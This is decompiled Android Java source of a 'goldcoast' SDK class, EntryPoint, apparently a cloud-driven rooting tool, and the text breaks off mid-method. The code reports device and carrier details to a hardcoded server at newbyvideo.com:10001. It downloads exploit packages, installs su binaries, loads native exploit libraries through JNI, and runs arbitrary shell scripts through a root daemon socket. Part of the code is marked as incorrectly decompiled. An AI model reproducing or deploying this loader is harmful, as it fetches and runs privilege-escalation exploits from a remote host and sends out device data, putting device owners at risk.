package com.goldcoast.sdk.domain;

import android.annotation.TargetApi;
import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.ConditionVariable;
import android.os.Process;
import android.support.v4.app.FrameMetricsAggregator;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.util.Pair;
import com.b.a.ai;
import com.b.a.ap;
import com.b.a.aq;
import com.b.a.x;
import com.b.a.y;
import com.goldcoast.sdk.a.d;
import com.goldcoast.sdk.a.f;
import com.goldcoast.sdk.b.b;
import com.goldcoast.sdk.c.a;
import com.goldcoast.sdk.c.c;
import com.goldcoast.sdk.c.e;
import com.goldcoast.sdk.c.g;
import com.goldcoast.sdk.c.h;
import com.king.sdk.IDFEE16B42C8B2890D8FF2860AF5562B1;
import com.king.sdk.KingListener;
import com.king.sdk.i;
import com.umeng.commonsdk.proguard.v;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateEncodingException;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class EntryPoint {
    public static final byte RS_LONG = 1;
    public static final byte RS_MIXED = 2;
    public static final byte RS_TEMP = 0;
    public static final byte S_120 = 3;
    public static final byte S_123 = 2;
    public static final byte S_43 = 1;
    public static final byte S_47 = 4;

    /* renamed from: a  reason: collision with root package name */
    private static EntryPoint f2952a = null;

    /* renamed from: b  reason: collision with root package name */
    private static byte f2953b = 1;

    /* renamed from: c  reason: collision with root package name */
    private static String f2954c = null;
    private static String d = null;
    private static String e = null;
    public static File extractDir = null;
    private static String f = null;
    private static ai g = new ai();
    private static AnalyseResult h = null;
    private static String i = null;
    /* access modifiers changed from: private */
    public static int j = 60;
    private static int k = -1;
    private static byte l = 0;
    private static boolean m = false;
    protected static Application mContext;
    private static final boolean n = (Build.VERSION.SDK_INT >= 14);
    private d A;
    private d B;
    /* access modifiers changed from: private */
    public boolean C = false;
    /* access modifiers changed from: private */
    public boolean D = false;
    private BroadcastReceiver E = new c(this);
    /* access modifiers changed from: private */
    public Pair<String, String> F;
    private final String[] o = {"天", "干", "地", "支", "山"};
    private final KingListener p = new a(this);
    private boolean q = false;
    /* access modifiers changed from: private */
    public int r;
    /* access modifiers changed from: private */
    public int s;
    private int t;
    private int u;
    /* access modifiers changed from: private */
    public ConnectivityManager v;
    private JNIWrapper w;
    private String x;
    private boolean y = false;
    private c z;

    static {
        try {
            System.loadLibrary("goldcoast");
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    private EntryPoint() {
        h.a();
        h.a("client", i);
        if (m) {
            this.w = new JNIWrapper();
        }
        extractDir = new File(mContext.getFilesDir().getAbsoluteFile() + File.separator + "ota" + File.separator + "elf");
        try {
            mContext.unregisterReceiver(this.E);
        } catch (Exception unused) {
        }
        this.v = (ConnectivityManager) mContext.getSystemService("connectivity");
        mContext.registerReceiver(this.E, new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"));
        g.a((Context) mContext);
        this.z = c.a((Context) mContext);
        initHost("http://www.newbyvideo.com:10001");
        b.a(f2954c);
    }

    private int a(d dVar) {
        b(String.format("key:%s\norder:%d name: %s", new Object[]{dVar.e(), Integer.valueOf(dVar.d()), dVar.a()}), 2);
        try {
            if (this.w == null) {
                return -1;
            }
            return this.w.loadSO(String.format("%s/ota/elf/%s", new Object[]{mContext.getFilesDir(), dVar.a()}));
        } catch (Exception e2) {
            e2.printStackTrace();
            return -1;
        }
    }

    private static String a(InputStream inputStream, String str) {
        ZipInputStream zipInputStream = new ZipInputStream(inputStream);
        String str2 = "";
        zipInputStream.available();
        String str3 = "";
        int i2 = 0;
        while (true) {
            ZipEntry nextEntry = zipInputStream.getNextEntry();
            if (nextEntry == null) {
                break;
            } else if (!str2.startsWith("META-INF") && !nextEntry.isDirectory()) {
                if (nextEntry.getName().startsWith("_")) {
                    str3 = nextEntry.getName();
                }
                i2++;
                str2 = nextEntry.getName();
                File file = new File(str, str2);
                file.delete();
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                a((InputStream) zipInputStream, (OutputStream) fileOutputStream);
                fileOutputStream.close();
                e.a(file);
            }
        }
        zipInputStream.close();
        return i2 > 1 ? str3 : str2;
    }

    static /* synthetic */ String a(String str, int i2) {
        if (i2 == 2 || i2 == 3) {
            String str2 = extractDir.getParent() + File.separator + ".romaster_root";
            File file = new File(extractDir.getAbsolutePath() + File.separator + str);
            e.a(file, new File(str2));
            e.a(str2, 493);
            file.delete();
            return extractDir.getParent() + File.separator + "shua .romaster_root";
        }
        return extractDir.getAbsolutePath() + File.separator + str;
    }

    private static String a(byte[] bArr) {
        StringBuilder sb = new StringBuilder(bArr.length * 2);
        for (int i2 = 0; i2 < bArr.length; i2++) {
            String hexString = Integer.toHexString(bArr[i2]);
            int length = hexString.length();
            if (length == 1) {
                hexString = "0" + hexString;
            }
            if (length > 2) {
                hexString = hexString.substring(length - 2, length);
            }
            sb.append(hexString.toUpperCase());
            if (i2 < bArr.length - 1) {
                sb.append(':');
            }
        }
        return sb.toString();
    }

    static /* synthetic */ void a(int i2) {
        try {
            h.a();
            String a2 = h.a("refer");
            if (!TextUtils.isEmpty(a2)) {
                JSONArray jSONArray = new JSONArray(a2);
                JSONArray jSONArray2 = new JSONArray();
                for (int i3 = 0; i3 < jSONArray.length(); i3++) {
                    if (i3 != i2) {
                        jSONArray2.put(jSONArray.get(i3).toString());
                    }
                }
                h.a();
                h.a("refer", jSONArray2.toString());
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    static /* synthetic */ void a(EntryPoint entryPoint, String str) {
        String str2;
        EntryPoint entryPoint2 = entryPoint;
        String str3 = str;
        String optString = new JSONObject(str3).optString("body", "");
        int i2 = 1;
        if (!TextUtils.isEmpty(optString)) {
            StringBuilder sb = new StringBuilder();
            sb.append("######\n");
            char c2 = 0;
            sb.append(String.format("<analyseP.Enc>:%s\n", new Object[]{str3}));
            g.a();
            g.b(sb.toString());
            JSONObject jSONObject = new JSONObject(a.b(optString));
            JSONArray optJSONArray = jSONObject.optJSONArray("bra");
            entryPoint2.t = optJSONArray.length();
            String optString2 = jSONObject.optString("global", "");
            int optInt = jSONObject.optInt("category", 0);
            String optString3 = jSONObject.optString("token", "");
            if (!TextUtils.isEmpty(optString3)) {
                h.a();
                h.a("client", optString3);
            }
            entryPoint2.c(optString2);
            String optString4 = jSONObject.optString("poc", "");
            ArrayList arrayList = new ArrayList();
            if (optJSONArray != null && optJSONArray.length() > 0) {
                int i3 = 0;
                while (i3 < optJSONArray.length()) {
                    if (!entryPoint2.C) {
                        entryPoint2.u = i3;
                        JSONObject jSONObject2 = optJSONArray.getJSONObject(i3);
                        String optString5 = jSONObject2.optString("file");
                        entryPoint2.x = jSONObject2.optString("params");
                        int optInt2 = jSONObject2.optInt("category");
                        int optInt3 = jSONObject2.optInt("order");
                        String optString6 = jSONObject2.optString("file_hex", "");
                        String optString7 = jSONObject2.optString("component", "");
                        String str4 = optString5.split("\\?")[c2];
                        String substring = str4.substring(str4.lastIndexOf("/") + i2, str4.length());
                        d dVar = r10;
                        String str5 = optString7;
                        String str6 = optString5;
                        d dVar2 = new d(substring, optInt2, optString4, optInt3, optString6, str6);
                        if (!entryPoint2.q) {
                            if ((optInt == 0 && !TextUtils.isEmpty(str5) && !str5.equals("null") && !str5.equals("[]")) || (i3 == 0 && !str5.equals("null") && !str5.equals("[]"))) {
                                b(str5);
                            }
                            com.goldcoast.sdk.b.a.a(str6, mContext, substring);
                            arrayList.add(substring);
                            int length = optJSONArray.length();
                            if (TextUtils.isEmpty(dVar.b())) {
                                str2 = "poc is null";
                            } else {
                                if (dVar.a().endsWith(".zip")) {
                                    String str7 = extractDir.getAbsolutePath() + File.separator + dVar.a();
                                    dVar.a(a((InputStream) new FileInputStream(str7), extractDir.getAbsolutePath()));
                                    new File(str7).delete();
                                }
                                if (k != 0) {
                                    entryPoint2.A = dVar;
                                    if (entryPoint2.z.c(dVar.a())) {
                                        str2 = "$$$ skip";
                                    } else {
                                        if (entryPoint2.r != 4) {
                                            entryPoint2.b(dVar);
                                        } else if (entryPoint2.w != null) {
                                            if (entryPoint2.a(dVar) != 3000) {
                                                if (i3 == length - 1) {
                                                    entryPoint2.b("$$$ failed", 1);
                                                    entryPoint.braFlush();
                                                } else {
                                                    str2 = "$$$ return null";
                                                }
                                            }
                                        }
                                        i3++;
                                        i2 = 1;
                                        c2 = 0;
                                    }
                                }
                                entryPoint.e();
                                i3++;
                                i2 = 1;
                                c2 = 0;
                            }
                            entryPoint2.b(str2, 2);
                            i3++;
                            i2 = 1;
                            c2 = 0;
                        } else {
                            return;
                        }
                    } else {
                        return;
                    }
                }
                entryPoint.braFlush();
            } else if (entryPoint2.r == 4) {
                entryPoint2.b("not found suitable su file\n$$$ failed ", 1);
            } else {
                entryPoint2.b("not found suitable su file ", 2);
            }
        } else if (entryPoint2.r == 4) {
            entryPoint2.b("response body is null\n$$$ failed", 1);
        } else {
            entryPoint2.b("response body is null", 2);
        }
    }

    static /* synthetic */ void a(EntryPoint entryPoint, String str, List list) {
        EntryPoint entryPoint2 = entryPoint;
        String str2 = str;
        String optString = new JSONObject(str2).optString("body", "");
        if (TextUtils.isEmpty(optString)) {
            entryPoint2.b("response body is null", 2);
            return;
        }
        g.a();
        g.b("######\n" + String.format("<analyseP.Enc>:%s\n", new Object[]{str2}));
        JSONObject jSONObject = new JSONObject(a.b(optString));
        JSONArray optJSONArray = jSONObject.optJSONArray("bra");
        entryPoint2.t = optJSONArray.length();
        String optString2 = jSONObject.optString("global", "");
        int optInt = jSONObject.optInt("category", 0);
        String optString3 = jSONObject.optString("token", "");
        if (!TextUtils.isEmpty(optString3)) {
            h.a();
            h.a("client", optString3);
        }
        entryPoint2.c(optString2);
        String optString4 = jSONObject.optString("poc", "");
        new ArrayList();
        if (optJSONArray != null && optJSONArray.length() > 0) {
            int i2 = 0;
            while (i2 < optJSONArray.length() && !entryPoint2.C) {
                entryPoint2.u = i2;
                JSONObject jSONObject2 = optJSONArray.getJSONObject(i2);
                String optString5 = jSONObject2.optString("file");
                entryPoint2.x = jSONObject2.optString("params");
                int optInt2 = jSONObject2.optInt("category");
                int optInt3 = jSONObject2.optInt("order");
                String optString6 = jSONObject2.optString("file_hex", "");
                String optString7 = jSONObject2.optString("component", "");
                String str3 = optString5.split("\\?")[0];
                g.a();
                g.a("parseResponse_m->braUrl=" + str3);
                d dVar = new d(optString5.substring(str3.lastIndexOf("/") + 1, str3.length()), optInt2, optString4, optInt3, optString6, optString5);
                if (!entryPoint2.q) {
                    if ((optInt == 0 && !TextUtils.isEmpty(optString7) && !optString7.equals("null") && !optString7.equals("[]")) || (i2 == 0 && !optString7.equals("null") && !optString7.equals("[]"))) {
                        b(optString7);
                    }
                    list.add(dVar);
                    i2++;
                } else {
                    return;
                }
            }
        } else if (entryPoint2.r == 4) {
            entryPoint2.b("not found suitable su file\n$$$ failed", 1);
        } else {
            entryPoint2.b("not found suitable su file ", 2);
        }
    }

    private static void a(InputStream inputStream, OutputStream outputStream) {
        byte[] bArr = new byte[4096];
        while (true) {
            int read = inputStream.read(bArr);
            if (read > 0) {
                outputStream.write(bArr, 0, read);
            } else {
                return;
            }
        }
    }

    static /* synthetic */ void a(String str) {
        try {
            h.a();
            String a2 = h.a("refer");
            JSONArray jSONArray = TextUtils.isEmpty(a2) ? new JSONArray() : new JSONArray(a2);
            jSONArray.put(str);
            h.a();
            h.a("refer", jSONArray.toString());
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void a(String str, int i2, int i3) {
        x a2 = new y().a("body", str).a();
        StringBuilder sb = new StringBuilder();
        sb.append(i3 == 2 ? "######rePost\n" : "######\n");
        sb.append(String.format("<feedbackQ.Enc>:%s\n", new Object[]{a2.toString()}));
        g.a();
        g.b(sb.toString());
        ConditionVariable conditionVariable = new ConditionVariable(false);
        conditionVariable.close();
        g.a(new ap().a(e).a((aq) a2).a()).a(new h(this, i3, str, conditionVariable, i2));
        conditionVariable.block();
    }

    @TargetApi(3)
    private void a(String str, int i2, String str2, int i3) {
        File file = new File(extractDir.getAbsolutePath(), str);
        com.goldcoast.sdk.a.g gVar = new com.goldcoast.sdk.a.g();
        f fVar = new f(f.a());
        com.goldcoast.sdk.c.d.a(mContext);
        fVar.a(com.goldcoast.sdk.c.d.a().b().b());
        gVar.a(fVar);
        gVar.a(str);
        gVar.a(i2);
        gVar.b(str2);
        gVar.a(System.currentTimeMillis());
        com.goldcoast.sdk.c.d.a(mContext);
        gVar.c(com.goldcoast.sdk.c.d.b());
        try {
            TelephonyManager telephonyManager = (TelephonyManager) mContext.getSystemService("phone");
            gVar.d(telephonyManager.getNetworkOperatorName());
            gVar.e(telephonyManager.getSimOperatorName());
        } catch (Exception unused) {
        }
        gVar.f(Locale.getDefault().getDisplayLanguage());
        gVar.g(Locale.getDefault().getDisplayCountry());
        h.a();
        gVar.h(h.a("client"));
        gVar.j(mContext.getPackageName());
        gVar.k(getCertificateFingerprintMD5());
        gVar.b(i3);
        gVar.i("4.0.14");
        file.delete();
        try {
            a(a.a(gVar.a().toString()), -1, 1);
        } catch (Exception unused2) {
        }
    }

    private boolean a(AnalyseResult analyseResult) {
        boolean z2;
        String str;
        NetworkInfo[] allNetworkInfo;
        ConnectivityManager connectivityManager = (ConnectivityManager) mContext.getSystemService("connectivity");
        if (connectivityManager != null && (allNetworkInfo = connectivityManager.getAllNetworkInfo()) != null) {
            int i2 = 0;
            while (true) {
                if (i2 >= allNetworkInfo.length) {
                    break;
                } else if (allNetworkInfo[i2].getState() == NetworkInfo.State.CONNECTED) {
                    z2 = true;
                    break;
                } else {
                    i2++;
                }
            }
        }
        z2 = false;
        if (!z2) {
            str = "start failed: 当前网络连接异常，请检测网络连接是否可用.";
        } else {
            h.a();
            if (TextUtils.isEmpty(h.a("client")) || mContext == null) {
                str = "start failed: 请在Application中调用 EntryPoint.init([context],[token])";
            } else if (analyseResult != null) {
                return true;
            } else {
                str = "start failed: 请初始化analyseResult参数";
            }
        }
        b(str, 1);
        return false;
    }

    private static boolean a(File file) {
        try {
            LocalSocket localSocket = new LocalSocket();
            localSocket.connect(new LocalSocketAddress("darwin.rodo", LocalSocketAddress.Namespace.ABSTRACT));
            byte[] bytes = file.getAbsolutePath().getBytes();
            ByteBuffer allocate = ByteBuffer.allocate(bytes.length + 4);
            allocate.order(ByteOrder.LITTLE_ENDIAN);
            allocate.putInt(bytes.length);
            allocate.put(bytes);
            localSocket.getOutputStream().write(allocate.array());
            byte[] bytes2 = String.valueOf(Process.myPid()).getBytes();
            Log.d("KingDaemon", "client pid=" + Process.myPid());
            ByteBuffer allocate2 = ByteBuffer.allocate(bytes2.length + 4);
            allocate2.order(ByteOrder.LITTLE_ENDIAN);
            allocate2.putInt(bytes2.length);
            allocate2.put(bytes2);
            localSocket.getOutputStream().write(allocate2.array());
            localSocket.close();
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    @TargetApi(5)
    private Pair<String, String> b(d dVar) {
        if (k == 0) {
            return new Pair<>("yes", "$$$ success");
        }
        ConditionVariable conditionVariable = new ConditionVariable(false);
        conditionVariable.close();
        c cVar = this.z;
        String a2 = dVar.a();
        if (!cVar.c(a2)) {
            String a3 = cVar.a();
            JSONArray jSONArray = null;
            if (TextUtils.isEmpty(a3)) {
                jSONArray = new JSONArray();
            } else {
                try {
                    jSONArray = new JSONArray(a3);
                } catch (JSONException e2) {
                    e2.printStackTrace();
                }
            }
            try {
                jSONArray.put(a2);
                cVar.a(jSONArray.toString());
            } catch (Exception e3) {
                e3.printStackTrace();
            }
        }
        new Thread(new j(this, dVar)).start();
        new Thread(new b(this, conditionVariable)).start();
        conditionVariable.block();
        this.z.b(dVar.a());
        if (this.F == null) {
            this.F = new Pair<>("no", "not return any result");
        }
        return this.F;
    }

    private void b() {
        File file = new File(extractDir.getParent());
        if (file.listFiles() != null) {
            try {
                for (File delete : file.listFiles()) {
                    delete.delete();
                }
            } catch (Exception unused) {
            }
        }
        extractDir.mkdirs();
        this.y = false;
    }

    private static void b(String str) {
        String str2 = str.split("\\?")[0];
        String substring = str2.substring(str2.lastIndexOf("/") + 1, str2.length());
        com.goldcoast.sdk.b.a.a(str, mContext, str2);
        String str3 = extractDir.getAbsolutePath() + File.separator + substring;
        a((InputStream) new FileInputStream(str3), extractDir.getAbsolutePath());
        new File(str3).delete();
    }

    /* access modifiers changed from: private */
    public void b(String str, int i2) {
        k = i2;
        if (i2 == 0) {
            if (!TextUtils.isEmpty(str)) {
                if (this.B == null || !this.B.a().equals(this.A.a())) {
                    this.B = this.A;
                    this.z.a("");
                    if (this.A != null) {
                        a(this.A.a(), 1, str, this.A.c());
                    }
                    int i3 = 0;
                    while (i3 < 30) {
                        try {
                            if (getStatus()) {
                                break;
                            }
                            Thread.sleep(1000);
                            i3++;
                        } catch (InterruptedException e2) {
                            e2.printStackTrace();
                        }
                    }
                    h.onSuccess(str);
                }
            }
        } else if (i2 == 1) {
            h.onFailed(str);
            braFlush();
            if (this.A != null) {
                a(this.A.a(), -1, str, this.A.c());
            }
        } else if (i2 == 2) {
            h.onProgress(str);
        } else if (this.r == 4 && this.t - 1 == this.u) {
            h.onFailed(str);
            braFlush();
            if (this.A != null) {
                a(this.A.a(), -1, str, this.A.c());
            }
        } else {
            h.onException(str);
        }
    }

    private void c() {
        File file = new File(mContext.getFilesDir().getAbsolutePath() + File.separator + "dump");
        if (file.exists()) {
            file.delete();
        }
        this.q = false;
        this.s = 0;
    }

    static /* synthetic */ void c(EntryPoint entryPoint) {
        if (!TextUtils.isEmpty(entryPoint.z.a())) {
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put("rf_md5", entryPoint.z.a());
                com.goldcoast.sdk.c.d.a(mContext);
                jSONObject.put(com.cyjh.common.b.a.aM, com.goldcoast.sdk.c.d.b());
                h.a();
                jSONObject.put("token", h.a("client"));
                jSONObject.put(v.j, mContext.getPackageName());
                jSONObject.put("signature", entryPoint.getCertificateFingerprintMD5());
                g.a(new ap().a(f).a((aq) new y().a("body", a.a(jSONObject.toString())).a()).a()).a();
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
    }

    private void c(String str) {
        if (!this.y) {
            String str2 = str.split("\\?")[0];
            String substring = str2.substring(str2.lastIndexOf("/") + 1, str2.length());
            String str3 = extractDir.getAbsolutePath() + File.separator + substring;
            com.goldcoast.sdk.b.a.a(str, mContext, substring);
            a((InputStream) new FileInputStream(str3), extractDir.getParent());
            new File(str3).delete();
            String format = String.format("%s%slibsu.so", new Object[]{extractDir.getParent(), File.separator});
            File file = new File(mContext.getFilesDir().getAbsolutePath() + File.separator + "permmgr" + File.separator + "libsu.so");
            if (!file.exists()) {
                file.mkdirs();
            }
            File file2 = new File(format);
            e.a(file2, file);
            e.a(file);
            file2.delete();
            this.y = true;
        }
    }

    private JSONObject d() {
        com.goldcoast.sdk.c.d.a(mContext);
        com.goldcoast.sdk.a.b a2 = com.goldcoast.sdk.c.d.a();
        JSONObject jSONObject = new JSONObject();
        f fVar = new f(f.a());
        com.goldcoast.sdk.c.d.a(mContext);
        fVar.a(com.goldcoast.sdk.c.d.c().b());
        a2.a(fVar);
        jSONObject.put("device", a2.a());
        jSONObject.put("self", mContext.getPackageName());
        h.a();
        jSONObject.put("token", h.a("client"));
        jSONObject.put(v.j, mContext.getPackageName());
        jSONObject.put("signature", getCertificateFingerprintMD5());
        jSONObject.put("keyword", "");
        return jSONObject;
    }

    private void e() {
        b("$$$ success", 0);
        this.q = true;
        braFlush();
    }

    static /* synthetic */ int f(EntryPoint entryPoint) {
        int i2 = entryPoint.s;
        entryPoint.s = i2 + 1;
        return i2;
    }

    /* access modifiers changed from: private */
    public void f() {
        new Thread(new i(this)).start();
    }

    private static boolean g() {
        try {
            LocalSocket localSocket = new LocalSocket();
            localSocket.connect(new LocalSocketAddress("darwin.rodo", LocalSocketAddress.Namespace.ABSTRACT));
            localSocket.close();
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    public static void init(Application application, String str, AnalyseResult analyseResult, int i2, byte b2) {
        mContext = application;
        h = analyseResult;
        h.a((Context) mContext);
        i = str;
        f2953b = b2;
        if (i2 >= 120) {
            j = i2;
        }
    }

    public static EntryPoint instance() {
        if (f2952a == null) {
            f2952a = new EntryPoint();
        }
        return f2952a;
    }

    /* JADX WARNING: Code restructure failed: missing block: B:43:0x00fd, code lost:
        return;
     */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public synchronized void analyse(com.goldcoast.sdk.domain.AnalyseResult r10) {
        /*
            r9 = this;
            monitor-enter(r9)
            r0 = -1
            k = r0     // Catch:{ all -> 0x00fe }
            h = r10     // Catch:{ all -> 0x00fe }
            com.goldcoast.sdk.domain.AnalyseResult r10 = h     // Catch:{ all -> 0x00fe }
            boolean r10 = r9.a((com.goldcoast.sdk.domain.AnalyseResult) r10)     // Catch:{ all -> 0x00fe }
            if (r10 != 0) goto L_0x0010
            monitor-exit(r9)
            return
        L_0x0010:
            boolean r10 = r9.getStatus()     // Catch:{ all -> 0x00fe }
            if (r10 == 0) goto L_0x001b
            r9.e()     // Catch:{ all -> 0x00fe }
            monitor-exit(r9)
            return
        L_0x001b:
            int r10 = k     // Catch:{ all -> 0x00fe }
            if (r10 != 0) goto L_0x0024
            r9.e()     // Catch:{ all -> 0x00fe }
            monitor-exit(r9)
            return
        L_0x0024:
            boolean r10 = r9.C     // Catch:{ all -> 0x00fe }
            r0 = 1
            if (r10 == 0) goto L_0x0030
            java.lang.String r10 = "busying now\n$$$ failed"
            r9.b(r10, r0)     // Catch:{ all -> 0x00fe }
            monitor-exit(r9)
            return
        L_0x0030:
            r9.b()     // Catch:{ all -> 0x00fe }
            r9.c()     // Catch:{ all -> 0x00fe }
            r9.f()     // Catch:{ all -> 0x00fe }
            org.json.JSONObject r10 = r9.d()     // Catch:{ all -> 0x00fe }
            r1 = 0
            r2 = 0
        L_0x003f:
            java.lang.String[] r3 = r9.o     // Catch:{ all -> 0x00fe }
            int r3 = r3.length     // Catch:{ all -> 0x00fe }
            if (r2 >= r3) goto L_0x00fc
            r3 = 3
            if (r2 == r3) goto L_0x00f8
            r9.r = r2     // Catch:{ all -> 0x00fe }
            boolean r3 = r9.q     // Catch:{ all -> 0x00fe }
            if (r3 == 0) goto L_0x004f
            monitor-exit(r9)
            return
        L_0x004f:
            r9.braFlush()     // Catch:{ all -> 0x00fe }
            boolean r3 = r9.C     // Catch:{ all -> 0x00fe }
            if (r3 != 0) goto L_0x00fc
            java.lang.Thread r3 = new java.lang.Thread     // Catch:{ all -> 0x00fe }
            com.goldcoast.sdk.domain.d r4 = new com.goldcoast.sdk.domain.d     // Catch:{ all -> 0x00fe }
            r4.<init>(r9)     // Catch:{ all -> 0x00fe }
            r3.<init>(r4)     // Catch:{ all -> 0x00fe }
            r3.start()     // Catch:{ all -> 0x00fe }
            int r3 = k     // Catch:{ all -> 0x00fe }
            if (r3 == 0) goto L_0x00f8
            android.os.ConditionVariable r3 = new android.os.ConditionVariable     // Catch:{ all -> 0x00fe }
            r3.<init>(r1)     // Catch:{ all -> 0x00fe }
            java.lang.String r4 = "正在云端  [%s]  字组查找方案 请等待..."
            java.lang.Object[] r5 = new java.lang.Object[r0]     // Catch:{ all -> 0x00fe }
            java.lang.String[] r6 = r9.o     // Catch:{ all -> 0x00fe }
            r6 = r6[r2]     // Catch:{ all -> 0x00fe }
            r5[r1] = r6     // Catch:{ all -> 0x00fe }
            java.lang.String r4 = java.lang.String.format(r4, r5)     // Catch:{ all -> 0x00fe }
            r5 = 2
            r9.b(r4, r5)     // Catch:{ all -> 0x00fe }
            java.lang.String r4 = "category"
            r10.put(r4, r2)     // Catch:{ all -> 0x00fe }
            java.lang.String r4 = "sdkV"
            java.lang.String r5 = "4.0.14"
            r10.put(r4, r5)     // Catch:{ all -> 0x00fe }
            java.lang.String r4 = "rtp"
            byte r5 = f2953b     // Catch:{ all -> 0x00fe }
            r10.put(r4, r5)     // Catch:{ all -> 0x00fe }
            com.b.a.y r4 = new com.b.a.y     // Catch:{ all -> 0x00fe }
            r4.<init>()     // Catch:{ all -> 0x00fe }
            java.lang.String r5 = "body"
            java.lang.String r6 = r10.toString()     // Catch:{ all -> 0x00fe }
            java.lang.String r6 = com.goldcoast.sdk.c.a.a(r6)     // Catch:{ all -> 0x00fe }
            com.b.a.y r4 = r4.a(r5, r6)     // Catch:{ all -> 0x00fe }
            com.b.a.x r4 = r4.a()     // Catch:{ all -> 0x00fe }
            java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ all -> 0x00fe }
            r5.<init>()     // Catch:{ all -> 0x00fe }
            java.lang.String r6 = "######\n"
            r5.append(r6)     // Catch:{ all -> 0x00fe }
            java.lang.String r6 = "<analyseQ.Enc>:%s\n"
            java.lang.Object[] r7 = new java.lang.Object[r0]     // Catch:{ all -> 0x00fe }
            java.lang.String r8 = r4.toString()     // Catch:{ all -> 0x00fe }
            r7[r1] = r8     // Catch:{ all -> 0x00fe }
            java.lang.String r6 = java.lang.String.format(r6, r7)     // Catch:{ all -> 0x00fe }
            r5.append(r6)     // Catch:{ all -> 0x00fe }
            com.goldcoast.sdk.c.g.a()     // Catch:{ all -> 0x00fe }
            java.lang.String r5 = r5.toString()     // Catch:{ all -> 0x00fe }
            com.goldcoast.sdk.c.g.b(r5)     // Catch:{ all -> 0x00fe }
            r3.close()     // Catch:{ all -> 0x00fe }
            boolean[] r5 = new boolean[r0]     // Catch:{ all -> 0x00fe }
            r5[r1] = r1     // Catch:{ all -> 0x00fe }
            com.b.a.ap r6 = new com.b.a.ap     // Catch:{ all -> 0x00fe }
            r6.<init>()     // Catch:{ all -> 0x00fe }
            java.lang.String r7 = d     // Catch:{ all -> 0x00fe }
            com.b.a.ap r6 = r6.a((java.lang.String) r7)     // Catch:{ all -> 0x00fe }
            com.b.a.ap r4 = r6.a((com.b.a.aq) r4)     // Catch:{ all -> 0x00fe }
            com.b.a.ao r4 = r4.a()     // Catch:{ all -> 0x00fe }
            com.b.a.ai r6 = g     // Catch:{ all -> 0x00fe }
            com.b.a.g r4 = r6.a((com.b.a.ao) r4)     // Catch:{ all -> 0x00fe }
            com.goldcoast.sdk.domain.e r6 = new com.goldcoast.sdk.domain.e     // Catch:{ all -> 0x00fe }
            r6.<init>(r9, r3, r5)     // Catch:{ all -> 0x00fe }
            r4.a(r6)     // Catch:{ all -> 0x00fe }
            r3.block()     // Catch:{ all -> 0x00fe }
        L_0x00f8:
            int r2 = r2 + 1
            goto L_0x003f
        L_0x00fc:
            monitor-exit(r9)
            return
        L_0x00fe:
            r10 = move-exception
            monitor-exit(r9)
            throw r10
        */
        throw new UnsupportedOperationException("Method not decompiled: com.goldcoast.sdk.domain.EntryPoint.analyse(com.goldcoast.sdk.domain.AnalyseResult):void");
    }

    public void braFlush() {
        if (extractDir != null && extractDir.listFiles() != null) {
            try {
                for (File delete : extractDir.listFiles()) {
                    delete.delete();
                }
            } catch (Exception unused) {
            }
        }
    }

    public void cleanSkipFlag() {
        this.z.a("");
    }

    public boolean exec(String[] strArr) {
        String str;
        String str2;
        if (!getStatus()) {
            str = "EntryPoint";
            str2 = "getStatus failed, Service not start";
        } else if (l == 0) {
            execDarwin(strArr);
            return true;
        } else if (l == 1) {
            try {
                i a2 = i.a((Context) mContext);
                int myPid = Process.myPid();
                String packageName = mContext.getPackageName();
                h.a();
                a2.a(strArr, myPid, packageName, h.a("client"));
                return true;
            } catch (Exception e2) {
                e2.printStackTrace();
                return true;
            }
        } else {
            str = "EntryPoint";
            str2 = "Service has been stoped";
        }
        Log.d(str, str2);
        return false;
    }

    public void execDarwin(String[] strArr) {
        if (strArr != null && strArr.length > 0) {
            File file = new File(mContext.getFilesDir(), "tmp.sh");
            if (!file.exists()) {
                try {
                    file.createNewFile();
                } catch (IOException e2) {
                    e2.printStackTrace();
                }
            }
            e.a(strArr, file);
            e.a(file.getAbsolutePath(), (int) FrameMetricsAggregator.EVERY_DURATION);
            a(file);
        }
    }

    public void getBra(d dVar) {
        com.goldcoast.sdk.b.a.a(dVar.f(), mContext, dVar.a());
        if (TextUtils.isEmpty(dVar.b())) {
            b("poc is null", 2);
        } else if (dVar.a().endsWith(".zip")) {
            String str = extractDir.getAbsolutePath() + File.separator + dVar.a();
            dVar.a(a((InputStream) new FileInputStream(str), extractDir.getAbsolutePath()));
            new File(str).delete();
        }
        this.A = dVar;
        if (this.z.c(dVar.a())) {
            b("$$$ skip", 2);
        } else if (this.r != 4) {
            b(dVar);
        } else if (a(dVar) == 3000) {
            e();
        } else {
            b("$$$ failed", 1);
            braFlush();
        }
    }

    public String getCertificateFingerprintMD5() {
        PackageInfo packageInfo;
        CertificateFactory certificateFactory;
        X509Certificate x509Certificate;
        try {
            packageInfo = mContext.getPackageManager().getPackageInfo(mContext.getPackageName(), 64);
        } catch (PackageManager.NameNotFoundException e2) {
            e2.printStackTrace();
            packageInfo = null;
        }
